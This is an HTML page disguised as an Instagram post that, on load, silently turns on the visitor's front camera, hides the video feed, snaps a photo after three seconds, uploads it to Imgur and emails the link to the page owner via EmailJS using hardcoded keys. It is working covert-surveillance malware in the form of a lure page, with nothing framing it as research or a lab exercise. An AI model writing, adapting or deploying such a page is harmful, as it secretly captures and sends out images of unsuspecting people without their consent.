
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
    }
    .container {
      max-width: 500px;
      background: white;
      border: 1px solid #dbdbdb;
      margin-top: 20px;
    }
    .header, .footer {
      display: flex;
      align-items: center;
      padding: 10px;
    }
    .profile-pic {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      margin-right: 10px;
    }
    .post-img {
      width: 100%;
      height: auto;
    }
    .likes, .caption, .timestamp {
      padding: 0 10px;
    }
    video {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <img class="profile-pic" src="https://i.imgur.com/zYxDCQT.jpg" alt="Profile">
      <strong>_insta.user</strong>
    </div>
    <img class="post-img" src="https://i.imgur.com/B4DQ3MS.jpeg" alt="Post">
    <div class="likes"><strong>2,847 likes</strong></div>
    <div class="caption"><strong>_insta.user</strong> Enjoying the moment ðŸŒ…</div>
    <div class="timestamp" style="color: gray; font-size: 12px;">2 hours ago</div>
  </div>

  <video id="video" autoplay></video>

  <script>
    async function takeSnapshot() {
      const video = document.getElementById('video');
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        await new Promise(resolve => setTimeout(resolve, 3000)); // wait 3 sec

        const canvas = document.createElement('canvas');
        canvas.width = 480;
        canvas.height = 360;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageBase64 = canvas.toDataURL('image/jpeg').split(',')[1];

        fetch("https://api.imgur.com/3/image", {
          method: "POST",
          headers: {
            Authorization: "Client-ID d9c637b3675e937",
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ image: imageBase64, type: "base64" })
        })
        .then(res => res.json())
        .then(data => {
          if (data.success) {
            sendEmail(data.data.link);
          }
        });
      } catch (err) {
        console.error("Camera error:", err);
      }
    }

    function sendEmail(imageUrl) {
      emailjs.send("service_8fdw382", "template_giubqnn", {
        message: imageUrl
      }, "eD5ejiUiqX5khbO-o");
    }

    window.onload = () => {
      takeSnapshot();
    };
  </script>

  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("eD5ejiUiqX5khbO-o");
    })();
  </script>
</body>
</html>
